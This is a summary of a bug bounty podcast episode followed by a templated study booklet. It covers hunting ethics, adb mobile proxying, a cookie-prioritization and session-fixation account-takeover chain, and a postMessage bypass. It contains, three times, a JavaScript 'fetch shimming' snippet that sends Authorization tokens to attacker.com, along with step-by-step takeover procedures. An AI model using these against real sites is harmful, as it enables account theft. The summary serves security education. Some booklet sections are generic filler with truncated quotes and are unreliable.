---
title: "Bug Bounty Ethics & CT Exclusive Bug Reports"
episode: 36
---


# Episode 36 Bug Bounty Ethics & CT Exclusive Bug Reports

**Guests/Hosts:** Justin Gardner, Joel Margolis (live from Tokyo live hacking event)  
**Date:** 2023-09-14 | **Duration:** 1:03:59

### TL;DR
- Ethics debate: is all bug bounty hunting ethical? Edge cases: reporting unexploitable configs, lying about severity, going out of scope
- Mobile proxy setup: `adb reverse tcp:8080 tcp:8080` for easy proxying
- Cookie prioritization ATO: set a cookie with a specific path → it's sent first; cookie-bomb the login path → login fails → victim resets password using attacker's session fixation
- Fetch shimming XSS: overwrite `window.fetch` to exfiltrate auth tokens from iframes
- PostMessage origin discovery via `overrideURL` parameter

### Key Takeaways
- **Ethics**: Reporting a configuration that is technically unexploitable is a grey area; transparency matters. Lying about severity or going out of scope crosses ethical lines.
- **Gone out of scope for impact?** It's like trespassing to save someone's cat — good intent, legally risky. Programs have every right to reject.
- **Mobile proxy**: `adb reverse tcp:8080 tcp:8080` + set WiFi proxy to `127.0.0.1:8080` — simplest and most reliable method
- **Fetch shimming**: Overwrite `window.fetch` in an iframe to exfiltrate Bearer tokens without needing to trace complex OAuth flows
- **Cookie prioritization**: A cookie set on a more specific path (`/login`) is sent before a cookie on a broader path (`/`); combine with cookie bombing to force a login failure → password reset → session fixation ATO

### Bugs and Findings

#### Cookie Prioritization ATO via Session Fixation + Cookie Bomb — ATO
- **Target/context:** Private program (undisclosed)
- **Root cause:** Cookies set on a specific path take priority over same-named cookies on broader paths. Cookie bombing a specific path causes request failure, leading user to reset password on attacker-fixated session.
- **Technique / how found:** XSS from Eric (todayisnew) → cookie prioritization + bombing + session fixation chain
- **Exploitation steps:**
  1. XSS on `sub1.target.com` — set a session cookie with path `/login` pointing to attacker's session
  2. Cookie-bomb `sub1.target.com/login` with many cookies → request size exceeds limit → login fails silently
  3. Victim thinks password is wrong → clicks "Forgot Password"
  4. Reset flow uses the attacker-fixated session token
  5. Attacker monitors reset flow, intercepts password reset form, sets own password → ATO
- **Key technical details:** Cookie path prioritization: `/login` paths sent before `/` | Bomb: fill cookie jar (>180 cookies) on specific path to cause request failure
- **Impact / severity / bounty:** Full account takeover; high/critical

#### PostMessage origin bypass via overrideURL — PostMessage XSS
- **Target/context:** Private program mobile app → web component
- **Root cause:** An iframe embedded in the main page accepts a `overrideURL` parameter to change the iframe source. No origin validation on postMessage.
- **Technique / how found:** Config JSON from mobile API (`urls` array) → found `.html` file → iframe with postMessage communication
- **Exploitation steps:**
  1. Set `overrideURL` to attacker's page
  2. Attacker's page sends postMessage to parent with `action: "goTo"` → redirects user
  3. Other postMessage actions: `getAuthToken`, `getGeolocation`
- **Key technical details:** PostMessage listener accepts any origin | `overrideURL` has no allowlist
- **Impact / severity / bounty:** ATO via auth token exfiltration; high

### Techniques and Primitives
- **Fetch shimming for XSS** — Overwrite `window.fetch` with a wrapper that exfiltrates the `Authorization` header: `const origFetch = window.fetch; window.fetch = function(url, opts) { fetch('//attacker.com/log?' + opts.headers.Authorization); return origFetch.apply(this, arguments); }`
- **Cookie path prioritization** — For same cookie name, the cookie with the most specific path wins (is sent first)
- **Mobile proxy via adb** — `adb reverse tcp:8080 tcp:8080` then set proxy to `127.0.0.1:8080` on the device

### Tools and Resources
- Frida SSL Pinning Bypass (universal unpinning script)
- Request Minimizer Burp plugin
- Android Debug Bridge (`adb`)

### Suggestions and Advices from Hunter
- Joel on going out of scope: "You are trespassing to save a cat — good intent, but technically illegal."
- Justin on cookie tricks: "I always look at the cookies first when assessing a new program. Figure out which one is the session token."
- "Use Request Minimizer to strip all unnecessary cookies from requests and find what's actually needed for auth."
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Ethics debate: is all bug bounty hunting ethical? Edge cases: reporting unexploitable configs, lying about severity, going out of scope

#### 2. What you should learn
- Understand **ethics**: reporting a configuration that is technically unexploitable is a grey area; transparency matters. lying about severity or going out of scope crosses ethical lines**
- Understand **gone out of scope for impact?** it's like trespassing to save someone's cat — good intent, legally risky. programs have every right to reject**
- Understand **mobile proxy**: `adb reverse tcp:8080 tcp:8080` + set wifi proxy to `127.0.0.1:8080` — simplest and most reliable method**
- Understand **fetch shimming**: overwrite `window.fetch` in an iframe to exfiltrate bearer tokens without needing to trace complex oauth flows**
- Understand **cookie prioritization**: a cookie set on a more specific path (`/login`) is sent before a cookie on a broader path (`/`); combine with cookie bombing to force a login failure → password reset → session fixation ato**

#### 3. Core concepts explained
**Cookie Prioritization ATO via Session Fixation + Cookie Bomb — ATO**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**PostMessage origin bypass via overrideURL — PostMessage XSS**
- **What it is:** Cross-Site Scripting — injecting malicious JavaScript that runs in a victim's browser session, allowing session theft, phishing, or further attacks.
- **Why it matters:** XSS remains one of the most common and impactful web vulnerabilities. Stored XSS can affect every user who views the page.
- **Common mistake:** Focusing only on reflected XSS and missing stored XSS in profile fields, file uploads, or message boards.

**Fetch shimming for XSS**
- Overwrite `window.fetch` with a wrapper that exfiltrates the `Authorization` header: `const origFetch = window.fetch; window.fetch = function(url, opts) { fetch('//attacker.com/log?' + opts.headers.Authorization); return origFetch.apply(this, arguments); }`

**Cookie path prioritization**
- For same cookie name, the cookie with the most specific path wins (is sent first)

**Mobile proxy via adb**
- `adb reverse tcp:8080 tcp:8080` then set proxy to `127.0.0.1:8080` on the device


#### 4. Techniques and tactics
**Fetch shimming for XSS**
- **What it is:** Overwrite `window.fetch` with a wrapper that exfiltrates the `Authorization` header: `const origFetch = window.fetch; window.fetch = function(url, opts) { fetch('//attacker.com/log?' + opts.headers.Authorization); return origFetch.apply(this, arguments); }`
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Cookie path prioritization**
- **What it is:** For same cookie name, the cookie with the most specific path wins (is sent first)
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Mobile proxy via adb**
- **What it is:** `adb reverse tcp:8080 tcp:8080` then set proxy to `127.0.0.1:8080` on the device
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Frida SSL Pinning Bypass (universal unpinning script)**
- **What it is:** A technique for security research discussed in this episode.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Request Minimizer Burp plugin**
- **What it is:** A technique for security research discussed in this episode.
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"Joel on going out of scope: "You are trespassing to save a cat"* — **good intent, but technically illegal.**
- *"Justin on cookie tricks: "I always look at the cookies first when assessing a new program. Figure out which one is the session token."*
- *"Use Request Minimizer to strip all unnecessary cookies from requests and find what's actually needed for auth."*

#### 6. Mental models
- **Joel on going out of scope: "You are trespassing to save a c** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Justin on cookie tricks: "I always look at the cookies first** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Use Request Minimizer to strip all unnecessary cookies from ** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** Ethics**: Reporting a configuration that is technically unexploitable is a grey area; transparency matters. Lying about severity or going out of scope crosses ethical lines.
- **Try this:** Gone out of scope for impact?** It's like trespassing to save someone's cat — good intent, legally risky. Programs have every right to reject.
- **Try this:** Mobile proxy**: `adb reverse tcp:8080 tcp:8080` + set WiFi proxy to `127.0.0.1:8080` — simplest and most reliable method
- **Try this:** Fetch shimming**: Overwrite `window.fetch` in an iframe to exfiltrate Bearer tokens without needing to trace complex OAuth flows

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users
- **RCE** — Remote Code Execution — running arbitrary code on a target server
- **OAuth** — Open standard for authorization — delegated access without sharing passwords
- **Burp** — Burp Suite — popular web application security testing proxy

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Cookie Prioritization ATO via Session Fixation + Cookie Bomb — ATO?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **Ethics debate: is all bug bounty hunting ethical? Edge cases: reporting unexploi**
2. **Ethics**: Reporting a configuration that is technically unexploitable is a grey **
3. **Gone out of scope for impact?** It's like trespassing to save someone's cat — go**
